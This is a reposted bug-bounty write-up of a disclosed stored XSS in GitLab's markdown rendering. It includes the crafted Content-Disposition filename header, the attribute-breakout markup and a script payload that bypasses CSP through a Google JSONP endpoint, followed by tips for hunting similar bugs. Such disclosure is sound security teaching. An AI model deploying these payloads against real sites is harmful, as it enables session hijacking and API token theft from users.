# :globe_with_meridians: $16,000 Bounty: Stored XSS in GitLab

> **Original Source:** [$16,000 Bounty: Stored XSS in GitLab](https://infosecwriteups.com/16-000-bounty-stored-xss-in-gitlab-a0f57e5c4245)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# $16,000 Bounty: Stored XSS in GitLab


## From Regex to XSS: Inside a $16,000 Vulnerability in GitLab


### Introduction


Security vulnerabilities often hide in the smallest implementation details. One such critical flaw was uncovered by security researcher vakzz who discovered a Stored Cross-Site Scripting (XSS) vulnerability in GitLab’s markdown rendering engine via the DesignReferenceFilter.


This vulnerability not only bypassed GitLab’s Content Security Policy (CSP) but also allowed attackers to inject arbitrary JavaScript anywhere markdown was processed such as issues comments and more.


For responsibly disclosing this high impact bug GitLab awarded a $16,000 bounty under report ID #1212067.


Let’s dive into how this vulnerability worked its potential impact and how other bug hunters can approach finding similar issues.

>

The Vulnerability: Breaking Out of Attributes via Filename Injection


GitLab allows users to upload design files (like images) that can be referenced in issues via markdown links. When rendering markdown GitLab uses a filter called DesignReferenceFilter to parse these references.


Under the hood a regex pattern was used to match filenames:


```
valid_char = %r{[^/\s]} # any char that is NOT slash or whitespace
filename_pattern = %r{ (?<url_filename> #{valid_char}+ \. #{ext}) }x
```


This regex allowed any character except slashes or spaces inside the filename including dangerous ones like “ (double quotes).


Later in the rendering pipeline, the matched filename would be interpolated into an <a href> link without escaping:


```
link = %(<a href="#{url}" ... >#{content}</a>)
```


By uploading a design file with a filename containing a double quote it was possible to break out of the href attribute and inject additional attributes or arbitrary markup.

### How the Researcher Exploited It


Step-by-Step:


- Create a project & issue on GitLab.com.

- Upload a design file but intercept the upload request using Burp Suite or similar.

- Modify the upload request’s Content Disposition header to use an encoded filename with a double quote:


```
Content-Disposition: form-data; name="1"; filename*=ASCII-8BIT''bbb%22class%3D%22gfm%22a%3D%27.png
```


This bypassed GitLab’s upload sanitization by avoiding the default workhorse pipeline.


4. The uploaded design now appears with the filename


```
bbb"class="gfm"a='.png
```


5. Now create a markdown link to that design


```
<a href='https://gitlab.com/project/issues/1/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>vakzz=here</a>
```


Rendering this markdown would result in an HTML like:


```
<a href="https://gitlab.com/.../bbb" class="gfm" a=".png" ... vakzz="here"></a>
```


Notice how the injected double quote broke out of href and inserted arbitrary attributes!


## Get Monika sharma’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


6. By combining this with GitLab’s ReferenceRedactor which replaces nodes with the content of data original it was possible to inject arbitrary HTML/JS:


```
<a href='...' data-original="&lt;script src='https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout'>&lt;/script>"></a>
```


Upon rendering, GitLab would replace the <a> tag with the contents of data-original injecting a <script> tag directly into the DOM!

### Impact


- Stored XSS anywhere markdown is rendered: issues merge requests comments etc.

- Bypasses GitLab’s CSP using a known JSONP endpoint ([https://apis.google.com/complete/search?...&callback=setTimeout](https://apis.google.com/complete/search?...=&callback=setTimeout))

- Can exfiltrate user API tokens allowing attackers to impersonate users and access private projects.

- GitLab confirmed this critical issue and rewarded $16,000 showing how impactful markdown and HTML rendering bugs can be!

>

How Can You Find Similar Bugs?


Here are actionable tips for bug hunters:


- Look for user controlled input being interpolated into HTML attributes (like href, src, alt) without proper escaping.

- Target features that parse references or dynamic content in markdown: custom filters link references mention parsers.

- Test file uploads for sanitization bypasses by modifying Content-Disposition headers or using unusual filename encodings (like filename*=).

- Try injecting special characters (“, ‘, >, <, =) into inputs that affect URLs or filenames.

- Chain vulnerabilities: even if injecting a quote only gives partial control check if other filters or transformers (like ReferenceRedactor) could let you escalate it into full HTML injection or XSS.

- Don’t forget CSP bypass vectors: public JSONP endpoints, <svg/onload> or <script src> pointing to allowed origins.

### Credits & Final Thoughts


A huge shoutout to vakzz for discovering and responsibly reporting this sophisticated vulnerability to GitLab!


- Report ID: #1212067

- Bounty Awarded: $16,000


This case shows that even well audited platforms like GitLab can have hidden edge cases especially around markdown rendering regex parsing and filename handling.


If you’re into bug bounty hunting always test content rendering pipelines and think about how input moves from user controlled data → parsed → interpolated → rendered.

>

Thanks for reading!Monika ✨☕

---

*Originally published on [Medium](https://infosecwriteups.com/16-000-bounty-stored-xss-in-gitlab-a0f57e5c4245). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
